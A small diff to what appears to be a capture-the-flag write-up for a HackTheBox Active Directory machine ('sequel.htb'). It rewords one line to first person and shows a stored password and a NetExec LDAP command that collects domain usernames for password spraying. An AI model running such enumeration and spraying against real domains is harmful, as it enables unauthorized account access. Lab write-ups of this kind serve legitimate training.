@@ -84,7 +84,7 @@ echo 'KxEPkKe6R8su' > creds.txt
 
 ### User Discovery
 
-LDAP enumeration built comprehensive user list for password spraying:
+I used LDAP enumeration to build a user list for password spraying:
 ```bash
 nxc ldap 'DC01' -u 'rose' -p creds.txt -d 'sequel.htb' --users | awk '{print $5}' | grep -vE '[\[|^-]' > users.txt
 
